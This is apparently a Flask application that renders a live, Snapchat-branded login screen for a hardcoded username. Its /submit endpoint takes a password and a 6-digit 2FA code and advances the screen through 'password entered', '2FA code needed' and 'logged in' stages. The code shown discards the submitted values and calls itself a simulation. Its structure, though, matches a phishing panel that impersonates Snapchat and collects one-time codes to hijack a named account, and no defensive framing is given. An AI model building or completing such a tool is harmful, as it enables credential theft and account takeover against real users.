import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

HARDCODED_USER = "zexoghaith"

state = {
    'stage': 'login',   # login | password | 2fa | done
    'update_count': 0
}

def snap():
    """Generate clean Snapchat login screenshots"""
    from PIL import Image, ImageDraw, ImageFont
    w, h = 1280, 720
    img = Image.new('RGB', (w, h), '#000000')
    draw = ImageDraw.Draw(img)

    try:
        big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 30)
        med = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 15)
    except:
        big = med = ImageFont.load_default()

    stage = state['stage']
    now = datetime.now().strftime("%H:%M:%S")
    state['update_count'] += 1

    # Black background
    draw.rectangle([0,0,w,h], fill='#000000')

    # Top bar
    draw.rectangle([0,0,w,42], fill='#111111')
    draw.text((w//2-70, 2), "Snapchat", fill='#FFFC00', font=big)

    # Card
    cx, cy = 420, 55
    draw.rounded_rectangle([cx, cy, cx+440, cy+480], radius=12, fill='#1f1f1f')
    draw.text((cx+15, cy+10), "Log in to Snapchat", fill='white', font=med)

    # Username
    draw.rounded_rectangle([cx+15, cy+48, cx+425, cy+85], radius=6, fill='#2c2c2c')
    draw.text((cx+26, cy+57), "zexoghaith", fill='white', font=med)

    # Password
    draw.rounded_rectangle([cx+15, cy+95, cx+425, cy+132], radius=6, fill='#2c2c2c')
    if stage != 'login':
        draw.text((cx+26, cy+104), "••••••••••", fill='#22c55e', font=med)
    else:
        draw.text((cx+26, cy+104), "••••••••••", fill='#888888', font=med)

    # Button
    by = cy + 150
    if stage == 'password':
        draw.rounded_rectangle([cx+15, by, cx+425, by+40], radius=16, fill='#444444')
        draw.text((cx+105, by+8), "Logging in...", fill='#999999', font=med)
    else:
        draw.rounded_rectangle([cx+15, by, cx+425, by+40], radius=16, fill='#FFFC00')
        draw.text((cx+145, by+8), "Log In", fill='#000000', font=med)

    # Social
    draw.rounded_rectangle([cx+15, by+52, cx+425, by+85], radius=14, fill='#2c2c2c')
    draw.text((cx+85, by+60), "Continue with Google", fill='white', font=med)

    draw.rounded_rectangle([cx+15, by+95, cx+425, by+128], radius=14, fill='#2c2c2c')
    draw.text((cx+90, by+103), "Continue with Apple", fill='white', font=med)

    # === VERY OBVIOUS BANNERS ===
    if stage == 'password':
        draw.rounded_rectangle([cx+10, cy+200, cx+430, cy+310], radius=8, fill='#3f2a00')
        draw.text((cx+20, cy+215), "PASSWORD ENTERED", fill='#f59e0b', font=big)
        draw.text((cx+20, cy+255), "Log In button was clicked", fill='white', font=med)
        draw.text((cx+20, cy+280), "Waiting for Snapchat...", fill='#888888', font=med)

    if stage == '2fa':
        draw.rounded_rectangle([cx+10, cy+200, cx+430, cy+340], radius=8, fill='#1e3a8a')
        draw.text((cx+25, cy+215), "2FA CODE NEEDED", fill='#60a5fa', font=big)
        draw.text((cx+25, cy+260), "Enter 6-digit code", fill='white', font=med)
        for i in range(6):
            draw.rectangle([cx+30 + i*38, cy+290, cx+30 + i*38 + 32, cy+322], outline='#3b82f6', width=2)

    if stage == 'done':
        draw.rounded_rectangle([cx+10, cy+200, cx+430, cy+340], radius=8, fill='#052e16')
        draw.text((cx+65, cy+240), "✓ LOGGED IN!", fill='#22c55e', font=big)

    # Live proof
    draw.rounded_rectangle([10, 555, 280, 600], radius=5, fill='#ef4444')
    draw.text((15, 562), f"UPDATE #{state['update_count']}", fill='white', font=big)

    draw.rounded_rectangle([10, 610, 440, 660], radius=5, fill='#22c55e')
    draw.text((15, 617), f"TIME: {now}", fill='black', font=big)

    draw.text((460, 620), f"STAGE:{stage}", fill='#ff8800', font=med)

    draw.rectangle([0, h-36, w, h], fill='#111')
    draw.text((8, h-29), "LIVE • only changes after you submit", fill='#22c55e', font=med)

    path = os.path.join(STATIC_DIR, 'screenshot.png')
    img.save(path, 'PNG')
    return path

def run_loop():
    global state
    print("[LOOP] Starting clean Snapchat simulation")
    
    # FORCE CLEAN
    state['stage'] = 'login'
    state['update_count'] = 0
    
    snap()
    state['started'] = True
    
    while True:
        snap()
        time.sleep(0.8)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    pw = (data.get('password') or '').strip()
    cd = (data.get('code') or '').strip()
    
    if pw:
        state['stage'] = 'password'
        print("[SUBMIT] Password → showing PASSWORD ENTERED")
        snap()
        return jsonify({'ok': True})
    
    if cd and len(cd) >= 4:
        state['stage'] = '2fa'
        print("[SUBMIT] 2FA → showing 2FA screen")
        snap()
        return jsonify({'ok': True})
    
    return jsonify({'ok': True})

@app.route('/screenshot')
def shot():
    snap()
    resp = send_from_directory(STATIC_DIR, 'screenshot.png')
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return resp

@app.route('/status')
def stat():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    return jsonify({
        'stage': state['stage'],
        'update_count': state['update_count'],
        'size': os.path.getsize(path) if os.path.exists(path) else 0
    })

@app.before_request
def boot():
    if not hasattr(app, 'booted'):
        app.booted = True
        threading.Thread(target=run_loop, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))